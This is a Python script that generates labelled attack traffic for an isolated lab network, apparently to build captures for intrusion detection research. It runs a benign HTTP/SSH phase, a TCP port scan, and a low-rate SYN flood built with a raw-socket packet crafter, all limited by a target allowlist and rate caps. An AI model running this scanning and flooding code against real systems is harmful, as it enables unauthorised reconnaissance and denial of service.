"""Lab attack traffic generator - ONLY for the isolated lab network (10.66.0.0/24).

Phases (each timestamped so captured flows can be labelled):
  benign  - normal HTTP requests and SSH banner grabs
  scan    - TCP connect port scan of ports 1-1024 (nmap -sT if installed, else pure Python)
  flood   - low-rate SYN flood (~200 packets/s) to port 80 (hping3 if installed, else a raw-socket
            Python sender; needs CAP_NET_RAW, which the lab container / network namespace provides)

Safety: refuses any target outside the lab allowlist, caps rates and durations.
"""
import argparse
import ipaddress
import json
import random
import shutil
import socket
import struct
import subprocess
import sys
import time
import urllib.request

LAB_NETWORKS = [ipaddress.ip_network("10.66.0.0/24")]
MAX_FLOOD_PPS = 500
MAX_FLOOD_SECONDS = 30


def check_target(ip):
    a = ipaddress.ip_address(ip)
    if not any(a in n for n in LAB_NETWORKS):
        sys.exit(f"REFUSED: {ip} is outside the lab allowlist {LAB_NETWORKS}. This tool only attacks the lab.")
    return str(a)


def benign(target, source=None, requests=30, seconds=10.0):
    t0 = time.time()
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    for i in range(requests):
        try:
            if source:
                # bind the client side to the lab source address (network-namespace mode)
                s = socket.create_connection((target, 80), timeout=3, source_address=(source, 0))
                s.sendall(f"GET /page{i % 5}.html HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n".encode())
                while s.recv(4096):
                    pass
                s.close()
            else:
                opener.open(f"http://{target}/page{i % 5}.html", timeout=3).read()
        except OSError:
            pass
        if i % 6 == 0:
            try:
                s = socket.create_connection((target, 22), timeout=3, source_address=(source, 0) if source else None)
                s.recv(256)
                s.close()
            except OSError:
                pass
        time.sleep(seconds / requests * random.uniform(0.5, 1.5))
    return {"phase": "benign", "start": t0, "end": time.time(), "requests": requests}


def scan(target, source=None, ports=range(1, 1025), use_nmap=True):
    t0 = time.time()
    open_ports = []
    rc = None
    if use_nmap and shutil.which("nmap") and not source:
        rc = subprocess.run(["nmap", "-sT", "-Pn", "-n", "--max-rate", "500", "-p", f"{ports[0]}-{ports[-1]}",
                             target], check=False, stdout=subprocess.DEVNULL).returncode
        tool = "nmap -sT"
    if rc != 0:
        t0 = time.time()
        for p in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            if source:
                s.bind((source, 0))
            try:
                if s.connect_ex((target, p)) == 0:
                    open_ports.append(p)
            except OSError:
                pass
            finally:
                s.close()
        tool = "python connect() scan"
    return {"phase": "scan", "start": t0, "end": time.time(), "ports": len(ports), "open": open_ports, "tool": tool}


def _csum(b):
    if len(b) % 2:
        b += b"\0"
    s = sum(struct.unpack(f"!{len(b) // 2}H", b))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _syn(src, dst, sport, dport, seq):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 5 << 4, 0x02, 64240, 0, 0)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", _csum(pseudo + tcp)) + tcp[18:]
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), random.randint(0, 65535), 0, 64, 6, 0,
                     socket.inet_aton(src), socket.inet_aton(dst))
    ip = ip[:10] + struct.pack("!H", _csum(ip)) + ip[12:]
    return ip + tcp


def flood(target, source, dport=80, pps=200, seconds=10.0, use_hping=True):
    pps, seconds = min(pps, MAX_FLOOD_PPS), min(seconds, MAX_FLOOD_SECONDS)
    t0 = time.time()
    n = int(pps * seconds)
    rc = None
    if use_hping and shutil.which("hping3"):
        rc = subprocess.run(["hping3", "-S", "-p", str(dport), "-i", f"u{int(1e6 / pps)}", "-c", str(n), target],
                            check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode
        tool = "hping3 -S"
    if rc not in (0, 1):  # not run, or failed to start (hping3 exits 1 when replies are missing)
        t0 = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        gap = 1.0 / pps
        for i in range(n):
            s.sendto(_syn(source, target, 1024 + (i * 7919) % 60000, dport, random.getrandbits(32)), (target, 0))
            nxt = t0 + (i + 1) * gap
            d = nxt - time.time()
            if d > 0:
                time.sleep(d)
        s.close()
        tool = "python raw-socket SYN sender"
    return {"phase": "flood", "start": t0, "end": time.time(), "packets": n, "pps": pps, "tool": tool}


def run_all(target, source=None, out=None, use_tools=True):
    target = check_target(target)
    if source:
        check_target(source)
    phases = [benign(target, source)]
    time.sleep(2)
    phases.append(scan(target, source, use_nmap=use_tools))
    time.sleep(2)
    phases.append(flood(target, source or _my_ip(target), use_hping=use_tools))
    time.sleep(2)
    phases.append(benign(target, source, requests=10, seconds=3))
    res = {"target": target, "attacker": source or _my_ip(target), "phases": phases}
    if out:
        with open(out, "w") as fh:
            json.dump(res, fh, indent=2)
    return res


def _my_ip(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((target, 9))
    ip = s.getsockname()[0]
    s.close()
    return ip


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="10.66.0.10")
    ap.add_argument("--out", default="/captures/attack_phases.json")
    ap.add_argument("--no-tools", action="store_true", help="use the pure-Python scan/flood even if nmap/hping3 exist")
    a = ap.parse_args()
    time.sleep(3)  # let tcpdump start
    print(json.dumps(run_all(a.target, out=a.out, use_tools=not a.no_tools), indent=2))
